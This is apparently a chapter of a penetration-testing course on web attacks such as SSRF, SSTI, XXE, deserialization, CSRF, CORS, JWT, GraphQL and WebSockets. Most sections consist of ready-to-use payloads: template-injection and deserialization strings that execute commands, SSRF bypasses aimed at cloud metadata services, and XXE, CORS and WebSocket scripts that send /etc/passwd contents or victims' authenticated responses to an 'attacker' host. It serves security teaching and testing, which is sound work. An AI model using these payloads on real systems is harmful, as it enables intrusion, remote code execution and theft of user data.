# 30 — Web Attacks

The bag of vulnerabilities that don't fit cleanly into the SQLi / XSS / file-upload / file-inclusion / command-injection chapters: IDOR, XXE, SSRF, SSTI, CSRF, prototype pollution, deserialization, request smuggling, and friends.

## Contents

- [IDOR — Insecure Direct Object Reference](#idor-insecure-direct-object-reference)
- [CSRF — Cross-Site Request Forgery](#csrf-cross-site-request-forgery)
- [SSRF — Server-Side Request Forgery](#ssrf-server-side-request-forgery)
- [SSTI — Server-Side Template Injection](#ssti-server-side-template-injection)
- [XXE — XML External Entity](#xxe-xml-external-entity)
- [Insecure Deserialization](#insecure-deserialization)
- [Prototype pollution (Node)](#prototype-pollution-node)
- [HTTP Request Smuggling](#http-request-smuggling)
- [CRLF injection / Header injection](#crlf-injection-header-injection)
- [Open redirect](#open-redirect)
- [CORS misconfiguration](#cors-misconfiguration)
- [JWT (JSON Web Tokens)](#jwt-json-web-tokens)
- [OAuth / OIDC pitfalls](#oauth-oidc-pitfalls)
- [Race conditions](#race-conditions)
- [Mass assignment / property tampering](#mass-assignment-property-tampering)
- [Path / parameter pollution & confusion](#path-parameter-pollution-confusion)
- [Cache poisoning](#cache-poisoning)
- [GraphQL](#graphql)
- [WebSockets](#websockets)
- [OAuth / SAML / WS-Federation deeper attacks](#oauth-saml-ws-federation-deeper-attacks)
- [Sources](#sources)

## IDOR — Insecure Direct Object Reference

The app uses a key supplied by the client to look up a record without re-checking authorization.

Patterns to look for:

```
GET /api/users/1234/orders/56
GET /document?id=4711
POST /transfer  amount=10&from=42&to=43
GET /uploads/8c3.../report.pdf       (UUIDs are not authorization)
```

Tactics:

- Increment / decrement IDs.
- Replace your ID with another known one.
- Swap UUIDs / hashes from a second account.
- Look for IDs in JSON keys, JWTs, hidden form fields, and API responses (often the next ID is leaked in a list view).
- Try same-IDOR-different-method: `GET /admin/x` blocked but `POST` not, or `PUT` accepts but `GET` doesn't.

Burp **Autorize** automates the "do these requests work as user B that should only work as user A" comparison.

## CSRF — Cross-Site Request Forgery

Trick a victim's browser into issuing an authenticated request to a target site that they are logged into.

PoC:

```html
<form action="https://target/account/email" method="POST">
  <input name="email" value="attacker@evil">
</form>
<script>document.forms[0].submit()</script>
```

Or via `fetch` for AJAX endpoints (works only if `SameSite=None` or absent):

```js
fetch('https://target/account/email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type':'application/x-www-form-urlencoded'},
  body: 'email=attacker@evil'
})
```

Defenses to look for / bypass:

| Defense | Bypass angle |
|---|---|
| `SameSite=Lax` (default in modern browsers) | Top-level GET still works → look for state-changing GET endpoints. |
| CSRF token tied to session | Reuse expired tokens, swap tokens between users, omit the parameter entirely. |
| Token in custom header | Use XSS to read it, or find an endpoint that accepts query/body version. |
| Origin / Referer check | Strip `Referer` (no-referrer policy on attacker page), use `data:` URI, find allowed-origin reflection. |
| Double-submit cookie | The cookie value is the token — if you can set a cookie via a sibling subdomain, you may forge both. |

JSON-only endpoints with custom `Content-Type: application/json` resist forms but yield to XHR/fetch when CORS allows credentialed requests from your origin.

## SSRF — Server-Side Request Forgery

The app fetches a URL the user controls. Use it to reach internal-only resources.

Targets:

```
http://127.0.0.1                    
http://localhost
http://10.0.0.0/8 / 172.16.0.0/12 / 192.168.0.0/16
http://169.254.169.254/latest/meta-data/    AWS IMDSv1
http://metadata.google.internal/             GCP
http://169.254.169.254/metadata/instance/    Azure
http://localhost:6379/                       internal Redis
http://localhost:8500/                       Consul
http://localhost:8080/admin                  internal admin
```

IMDSv2 requires a token first (`PUT` with `X-aws-ec2-metadata-token-ttl-seconds`); modern AWS often forces v2.

Bypass parser confusion when the app validates the URL:

```
http://127.0.0.1#@evil.com/
http://evil.com@127.0.0.1/
http://2130706433/                   (decimal 127.0.0.1)
http://0x7f000001/                   (hex)
http://017700000001/                 (octal)
http://[::1]/                        (IPv6 loopback)
http://localhost.evil.com.attacker/  (DNS rebinding setup)
http://0/                            (some parsers)
http://[::ffff:127.0.0.1]/
```

Other URL schemes when `http(s)` is filtered:

```
file:///etc/passwd
gopher://127.0.0.1:6379/_<urlencoded-redis-cmds>
dict://localhost:11211/stats
ftp://127.0.0.1:22/
ldap://127.0.0.1/
```

`gopher://` is the workhorse for forging arbitrary TCP payloads (Redis, MySQL handshake, SMTP).

Blind SSRF — if the app fetches but does not echo: catch with Burp Collaborator, exfiltrate via DNS labels, or measure response time.

## SSTI — Server-Side Template Injection

User input concatenated into a template that runs on the server.

Detection:

```
{{7*7}}        Jinja2, Twig, Tornado → 49
${7*7}         FreeMarker, Velocity, JSP EL → 49
<%= 7*7 %>     ERB → 49
#{7*7}         Pug, Slim
{7*7}          Smarty
${{7*7}}       some Razor / Vue / Angular contexts
```

If the result becomes 49, you have execution in the template language.

### Jinja2 / Flask

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<idx>]("id", shell=True, stdout=-1).communicate() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

{{ cycler.__init__.__globals__.os.popen('id').read() }}

{{ lipsum.__globals__['os'].popen('id').read() }}

{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Twig / Symfony

```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

### FreeMarker

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity

```
#set($e="exp")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### ERB / Ruby

```
<%= `id` %>
<%= system("id") %>
```

### Smarty

```
{php}system("id");{/php}
{system("id")}
```

Tool: `tplmap` automates detection and exploitation across most engines.

## XXE — XML External Entity

XML parser that resolves entities turns "user posts XML" into file read / SSRF / RCE.

Detection:

```xml
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY a "test"> ]>
<x>&a;</x>
```

If the response includes `test`, entity expansion is live.

### File read

```xml
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY a SYSTEM "file:///etc/passwd"> ]>
<x>&a;</x>
```

### SSRF

```xml
<!DOCTYPE x [ <!ENTITY a SYSTEM "http://internal:8080/"> ]>
<x>&a;</x>
```

### Out-of-band (when no echo)

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % d SYSTEM "http://attacker/x.dtd">
  %d;
]>
<x>&exfil;</x>
```

`x.dtd`:

```xml
<!ENTITY % p SYSTEM "file:///etc/passwd">
<!ENTITY % w "<!ENTITY exfil SYSTEM 'http://attacker/?d=%p;'>">
%w;
```

### Blind / error-based

If only errors come back, force the parser to error on the file content:

```xml
<!ENTITY % p SYSTEM "file:///etc/passwd">
<!ENTITY % e "<!ENTITY x SYSTEM 'file:///nonexistent/%p;'>">
```

The file content lands in the error message about the unresolvable path.

### XXE in non-XML formats

- SOAP, SAML — XML inside.
- Office docs (`.docx`, `.xlsx`) — XML inside ZIP.
- SVG — XML; sometimes processed server-side for thumbnails.

## Insecure Deserialization

Untrusted serialized data is deserialized → object construction with attacker-chosen state → gadget chains → RCE.

### PHP — `unserialize()`

```php
$x = unserialize($_COOKIE['data']);
```

Tools:

- `phpggc` — pre-built gadget chains for popular frameworks (Laravel, Symfony, Magento, Yii, etc.)

```bash
phpggc Laravel/RCE9 system 'id' -b
# Submit the output where unserialize is called.
```

### Java

Class with `readObject` triggers code on deserialization. Tools:

- `ysoserial` — generates payloads for CommonsCollections, Spring, Groovy, Hibernate, etc.

```bash
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0
```

### .NET

`BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `XmlSerializer` (with type-binder confusion).

```bash
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "id"
```

### Python

`pickle.loads()` of untrusted data is RCE by definition (`__reduce__`).

```python
import pickle, os
class P:
  def __reduce__(self): return (os.system, ('id',))
print(pickle.dumps(P()))
```

### Node.js

`node-serialize`, `serialize-javascript` (older versions) — IIFE-based payloads.

```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(e,o){console.log(o);})}()"}
```

## Prototype pollution (Node)

Mutate the global `Object.prototype` so every object inherits attacker-controlled properties.

```
__proto__[isAdmin]=true
constructor.prototype.isAdmin=true
{"__proto__":{"polluted":"yes"}}
```

Used to bypass authorization, trigger gadgets in templating engines (lodash → EJS RCE), or change behaviour of other libraries.

## HTTP Request Smuggling

Frontend (CDN/LB) and backend disagree on where one request ends and the next starts. Smuggle a partial request to be prefixed onto another user's request.

Variants:

- `CL.TE` — Frontend honors `Content-Length`, backend honors `Transfer-Encoding`.
- `TE.CL` — opposite.
- `TE.TE` — both implement TE but one is fooled by an obfuscation (`Transfer-encoding: chunked\r\nTransfer-encoding: x`).

Tool: **Burp HTTP Request Smuggler** extension.

```
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Impact: cache poisoning, victim request hijack, auth bypass.

## CRLF injection / Header injection

User input ends up in a response header without sanitization:

```
GET /redirect?to=ok%0d%0aSet-Cookie:%20admin=1 HTTP/1.1
```

Effects: cookie injection, response splitting → cache poisoning, XSS via `Content-Type` rewrite.

## Open redirect

```
?next=//evil.com
?redirect=https://evil.com
?url=//evil.com\@target.com
?return=javascript:alert(1)        (rare, but seen)
```

Low severity alone, useful for chaining (OAuth redirect_uri abuse, phishing).

## CORS misconfiguration

Look for:

```
Access-Control-Allow-Origin: <reflected from Origin>
Access-Control-Allow-Credentials: true
```

If the origin reflection is unrestricted (or `null` is allowed) and credentials are allowed, build an attacker page that fetches privileged resources cross-origin and exfiltrates the response.

```html
<script>
fetch('https://target/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(t => fetch('https://attacker/?d=' + btoa(t)));
</script>
```

## JWT (JSON Web Tokens)

Quick checks:

- Decode header/payload (base64url):

```bash
jwt decode <token>
echo "<header>" | base64 -d
```

- `alg: none` — change to `none`, drop the signature (some old libs accept).
- `alg: HS256` with public RSA key — sign with the public key as HMAC secret.
- Key confusion: change `alg` from RS256 to HS256, sign with the public key.
- Weak HS256 secret: brute force.

```bash
hashcat -m 16500 token.jwt rockyou.txt
jwt-cracker <token>
```

Tool: `jwt_tool` covers all the above plus `kid` injection and JKU/X5U abuse.

## OAuth / OIDC pitfalls

- **redirect_uri** open or pattern-relaxed: capture authorization code at attacker URL.
- Missing **state** → CSRF in the auth flow.
- **PKCE** not enforced on confidential clients accepting public flows.
- **id_token** signature not verified.
- Implicit flow tokens leaked via `Referer` from the redirect.

## Race conditions

Same request fired N times before the server-side state mutates wins each race.

Tool: **Burp Repeater "Send group in parallel"** (single-packet attack uses HTTP/2 last-byte sync). Or `Turbo Intruder` with `engine=Engine.BURP2` and `concurrentConnections=10`.

Findings frequently come from: redeem-once codes, transfer-with-balance-check, voucher application, account-creation rate limits.

## Mass assignment / property tampering

Frameworks bind every JSON key in the request to model fields:

```json
POST /signup
{"name":"alice","email":"a@b","is_admin":true}
```

If `is_admin` is not on the allowlist, the server happily sets it.

Look for hidden privileged fields by reading API responses (`role`, `is_admin`, `verified`, `tenantId`).

## Path / parameter pollution & confusion

```
?role=user&role=admin              (Tomcat picks last; PHP picks last; ASP.NET concatenates)
/api/v1/admin/x;jsessionid=...     (matrix params confuse routing)
%00 / %0a / %2f                    (semantic differences across layers)
```

## Cache poisoning

Headers reflected into cached responses:

```
GET /home HTTP/1.1
Host: target
X-Forwarded-Host: evil.com         (reflected into <link>/<script>)
X-Forwarded-Scheme: nothttps       (reflected into Location)
X-Original-URL: /admin             (auth-bypass cache key confusion)
```

Find the cache key, find an unkeyed header that influences the response, poison.

## GraphQL

Single endpoint (commonly `/graphql`, `/api/graphql`, `/v1/graphql`) accepting POSTed queries. Different attack shape from REST.

### Detection

```bash
curl -s https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
# {"data":{"__typename":"Query"}}
```

Other discovery endpoints: `/graphiql`, `/playground`, `/altair`, `/voyager` — interactive consoles often exposed in dev.

### Introspection

If introspection is on, the schema dumps itself:

```graphql
{
  __schema {
    types { name fields { name type { name } } }
    queryType { name }
    mutationType { name }
  }
}
```

Tooling:

```bash
graphw00f -t https://target/graphql            # fingerprint engine
clairvoyance --url https://target/graphql -o schema.json   # bypass introspection-disabled
inql -t https://target/graphql                  # Burp ext / standalone
graphqlmap                                       # interactive
```

### Common attack patterns

- **Authorization on individual fields** — `me.email` may be public but `me.passwordResetToken` reachable in the same query.
- **Field/alias batching** — bypass per-mutation rate limits:

  ```graphql
  mutation {
    a: login(user:"alice", pass:"a1") { token }
    b: login(user:"alice", pass:"a2") { token }
    c: login(user:"alice", pass:"a3") { token }
  }
  ```

- **Query nesting** — recursive types → resource exhaustion / DoS.
- **Mutation tampering** — call admin-only mutations by guessing names from the schema.
- **Injection in resolvers** — SQLi / NoSQLi / SSRF inside arguments.
- **CSRF on `application/json`** when the server also accepts `application/x-www-form-urlencoded`.

## WebSockets

Long-lived bidirectional channel over a single TCP connection (HTTP/1.1 upgrade or HTTP/2 extension). Burp's WebSocket history tab shows messages in real time.

### Detection / interception

```javascript
// In browser devtools
let ws = new WebSocket('wss://target/socket');
ws.onmessage = e => console.log('recv:', e.data);
ws.send(JSON.stringify({type:'join', room:'admin'}));
```

In Burp: **Proxy → WebSocket history**, then drag a message to **Repeater** to replay/modify.

### What to test

- **Cross-Site WebSocket Hijacking (CSWSH)** — browser auto-includes cookies on the WS handshake; if there's no `Origin` check, an attacker page can open a WS connection as the victim.

  ```html
  <script>
    let ws = new WebSocket('wss://target/socket');
    ws.onmessage = e => fetch('https://attacker/?d='+btoa(e.data));
  </script>
  ```

- **Message-level authorization** — does the server check who's allowed to send `{"action":"deleteUser","id":42}`?
- **Injection** — message fields land in DB / shell / template just like HTTP params.
- **Race conditions** — easier on persistent sockets with low latency.

## OAuth / SAML / WS-Federation deeper attacks

Out-of-scope for an intro module — but worth knowing the attack surfaces exist:

- SAML signature wrapping / XML comments (`SAMLRaider`).
- JWT vs SAML mixed-mode confusion.
- XInclude in SOAP services.
- Same-Origin Method Execution (SOME).

## Sources

- OWASP Top 10: https://owasp.org/Top10/
- OWASP Cheat Sheets: https://cheatsheetseries.owasp.org/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTricks (Web): https://book.hacktricks.wiki/en/pentesting-web/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- ysoserial / phpggc / tplmap / jwt_tool: official repos.
